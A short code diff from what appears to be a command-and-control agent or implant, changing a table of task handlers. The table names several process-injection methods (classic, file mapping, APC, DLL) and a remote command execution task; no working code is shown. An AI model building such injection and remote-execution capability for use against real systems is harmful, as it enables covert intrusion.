@@ -7,13 +7,11 @@
 
 TaskHandler handles[] = 
 {
-    pingServer,
-    initAgentId,
     injectViaClassicProcessTask,
     injectViaFileMappingTask,
     injectViaApcTask,
     injectViaDllTask,
-    executeCommandTask
+    executeCommandTask,
 };
 
 void _processMessage(PTASK_MANAGER pTaskManager);
